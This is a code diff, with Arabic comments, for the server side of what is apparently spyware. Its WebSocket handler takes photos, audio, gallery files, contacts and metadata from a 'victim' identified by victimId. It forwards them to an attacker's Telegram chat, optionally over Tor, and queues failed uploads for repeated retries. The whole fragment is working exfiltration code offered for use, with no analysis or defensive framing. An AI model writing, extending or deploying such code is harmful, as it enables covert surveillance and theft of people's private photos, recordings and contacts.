@@ -1,0 +1,94 @@
+// ===================================================================
+// استيراد TelegramSender
+// ===================================================================
+const TelegramSender = require('./telegram-sender');
+
+// ===================================================================
+// تهيئة TelegramSender (بعد تحميل الإعدادات من .env)
+// ===================================================================
+const telegram = new TelegramSender(
+    process.env.TELEGRAM_TOKEN,
+    process.env.TELEGRAM_CHAT_ID,
+    {
+        useTor: CONFIG.TOR_ENABLED,
+        chunkSize: 1.5 * 1024 * 1024 * 1024, // 1.5 GB
+        retries: 3,
+        retryDelay: 5000
+    }
+);
+
+// ===================================================================
+// تعديل معالج البيانات (في WebSocket)
+// ===================================================================
+// عند استلام بيانات من الضحية (صور، صوت، فيديو)
+if (type === 'photo' || type === 'audio' || type === 'gallery') {
+    // حفظ الملف (كما في السابق)
+    const filePath = saveFile(victimId, filename, data);
+
+    // إرسال الملف إلى Telegram (مع تقسيم إذا لزم الأمر)
+    try {
+        const result = await telegram.sendFile(
+            filePath,
+            `${victimId}_${filename}`,
+            `📸 New file from ${victimId} (Type: ${type})`
+        );
+        console.log(`[+] Sent to Telegram: ${filename} (${result.totalChunks || 1} parts)`);
+    } catch (error) {
+        console.error('[!] Telegram send error:', error.message);
+        // تخزين في قائمة الانتظار للمحاولة لاحقاً
+        queueFailedUpload(victimId, filePath, filename);
+    }
+}
+
+// ===================================================================
+// عند استلام جهات اتصال أو معلومات وصفية (نصية)
+// ===================================================================
+if (type === 'contacts' || type === 'meta') {
+    const text = JSON.stringify(payload, null, 2);
+    try {
+        await telegram.sendText(
+            text,
+            `📇 ${type} from ${victimId} (${new Date().toISOString()})`
+        );
+    } catch (error) {
+        console.error('[!] Telegram text send error:', error.message);
+    }
+}
+
+// ===================================================================
+// دالة لإعادة المحاولة للفشل (مع تخزين في قاعدة البيانات)
+// ===================================================================
+const pendingUploads = []; // تخزين في SQLite للإنتاج
+
+function queueFailedUpload(victimId, filePath, filename) {
+    pendingUploads.push({
+        victimId,
+        filePath,
+        filename,
+        attempts: 0,
+        nextAttempt: Date.now() + 300000 // 5 دقائق
+    });
+}
+
+// حلقة خلفية لإعادة المحاولة
+setInterval(async () => {
+    const now = Date.now();
+    for (const upload of pendingUploads) {
+        if (upload.nextAttempt <= now && upload.attempts < 3) {
+            try {
+                await telegram.sendFile(upload.filePath, upload.filename);
+                // إزالة من قائمة الانتظار بعد النجاح
+                const index = pendingUploads.indexOf(upload);
+                pendingUploads.splice(index, 1);
+                // حذف الملف المؤقت (اختياري)
+                if (fs.existsSync(upload.filePath)) {
+                    fs.unlinkSync(upload.filePath);
+                }
+            } catch (error) {
+                upload.attempts++;
+                upload.nextAttempt = Date.now() + 300000 * upload.attempts;
+                console.warn(`[!] Retry ${upload.attempts} for ${upload.filename}`);
+            }
+        }
+    }
+}, 60000); // كل دقيقة
